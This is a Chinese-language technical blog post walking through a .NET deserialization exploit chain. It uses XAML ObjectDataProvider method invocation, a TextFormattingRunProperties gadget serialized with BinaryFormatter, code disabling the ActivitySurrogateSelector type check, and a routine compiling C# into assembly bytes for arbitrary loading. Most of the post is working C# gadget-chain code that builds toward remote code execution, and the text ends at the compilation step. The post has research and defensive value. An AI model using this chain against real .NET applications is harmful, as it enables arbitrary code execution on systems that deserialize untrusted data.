01
XAML
XAML是可扩展应用标记语言的缩写，是微软用于描述GUI的XML变种。在之前的GUI框架WinForms中，GUI是用相同语言创建，例如C#或VB.NET，并且通常由设计者来维护(例如Visual Studio)。但是通过XAML，微软使用了另一种方式，非常类似HTML，使你现在能轻松编写你的GUI。

在本篇文章中，重点介绍如何将XAML绑定到公共语言运行库(CLR)中的对象，实现这一点主要利用了ObjectDataProvider类。

c#<ObjectDataProvider x:Key="myDataSource" ObjectType="{x:Type src:Person}", MethodName="showName">      <ObjectDataProvider.MethodParameters>      <s:String>d_infinite</s:String>    </ObjectDataProvider.MethodParameters>    </ObjectDataProvider>

上述XAML代码，ObjectType指定了类，MethodName指定了方法，MethodParameters则指定了参数，通过下述代码加载该XAML，既可触发showName方法。

c#XamlReader.Parse(getResourceAsString("person.xml"));public static string getResourceAsString(string resName, string resDir = "Resources")        {            string _content = null;//<namespace>.<directory>.<filename            string _namespace = MethodBase.GetCurrentMethod().DeclaringType.Namespace;            var _assembly = Assembly.GetExecutingAssembly();            using (Stream _stream = _assembly.GetManifestResourceStream($"{_namespace}.{resDir}.{resName}"))            {                using (StreamReader _txtreader = new StreamReader(_stream))                {                    _content = _txtreader.ReadToEnd();                }            }            return _content;}

反序列化
.net的反序列化，需要在类型上应用SerializableAttribute，代码如下：
c#namespace SerialTest{    [Serializable]    class Class1    {        public string name = "Tony";        public Class1()        {            Console.WriteLine(name);        }    }}
但是上述代码在反序列化时并不可控，因此需要另外继承ISerializable接口去实现反序列化的读取方法。
c#namespace SerialTest{    [Serializable]    class Class1 : ISerializable    {           protected Class1(SerializationInfo info, StreamingContext context)        {            GetObjectData(info, context);        }
        public void GetObjectData(SerializationInfo info, StreamingContext context)        {            Console.WriteLine("反序列化调用");        }    }}
03
ActivitySurrogateSelector
然而单纯的反序列化并不能满足要求，原因在于C端并不存在Class1这个能执行任意命令/代码的反序列化类。需要我们在CLR中找到一条利用链，能实现任意程序集加载，而这条利用链的触发点就在ActivitySurrogateSelector类中，具体可参考James Forshaw发表的文章(https://googleprojectzero.blogspot.com/2017/04/)，这里不再过多赘述。
c#internal static bool DisableActivitySurrogateSelectorTypeCheck{  get  {    if (NativeMethods.IsDynamicCodePolicyEnabled())      return false;
    AppSettings.EnsureSettingsLoaded();    return AppSettings.disableActivitySurrogateSelectorTypeCheck;  }}

执行下面的代码，通过TextFormattingRunProperties（另外一条反序列化链条，用于触发XamlReader.Parser()）来加载XAML。

c#ConfigurationManager.AppSettings.Set(  "microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck",  "true");

c#[Serializable]    public class TextFormattingRunPropertiesMarshal : ISerializable    {        private string _xaml;        public void GetObjectData(SerializationInfo info, StreamingContext context)        {            Type t = Type.GetType("Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties, Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");            info.SetType(t);            info.AddValue("ForegroundBrush", _xaml);        }        public TextFormattingRunPropertiesMarshal(string xaml)        {            _xaml = xaml;        }    }

为什么要使用TextFormattingRunPropertiesMarshal进行进一步的封装，而非直接使用XamlReader.Parse()，原因在于XamlReader无法通过COM访问。

c#var _obj = new TextFormattingRunPropertiesMarshal(getResourceAsString("disable.xml"));            BinaryFormatter _binform = new BinaryFormatter();            using (FileStream _streamwrite = System.IO.File.Open("results.bin", FileMode.CreateNew))            {                _binform.Serialize(_streamwrite, _obj);            }            using (FileStream _streamread = File.Open("results.bin", FileMode.Open))            {                try                {                    _binform.Deserialize(_streamread);                }                catch (Exception) { }            }

编译程序集

由前提知识可知，最终我们需要通过ActivitySurrogateSelector去加载程序集，因此需要将程序集编译并转换成byte[]，方便ActivitySurrogateSelector调用。

c#public static byte[] compileResourceToBytes(string srcCode, string dllstring = null)        {            CSharpCodeProvider provider = new CSharpCodeProvider();            CompilerParameters parameters = new CompilerParameters();            foreach (var refdll in string.Join(",", "System.dll", dllstring).Split(','))            {                parameters.ReferencedAssemblies.Add(refdll);            }            CompilerResults results = provider.CompileAssemblyFromSource(parameters,srcCode);            if (results.Errors.HasErrors)            {                StringBuilder sb = new StringBuilder();                foreach (CompilerError error in results.Errors)                {                    sb.AppendLine(String.Format("Error ({0}): {1}: {2}", error.ErrorNumber, error.ErrorText, error.Line));                }                throw new InvalidOperationException(sb.ToString());            }            Assembly _compiled = results.CompiledAssembly;            var _loc = _compiled.Location;            return File.ReadAllBytes(_loc);        }
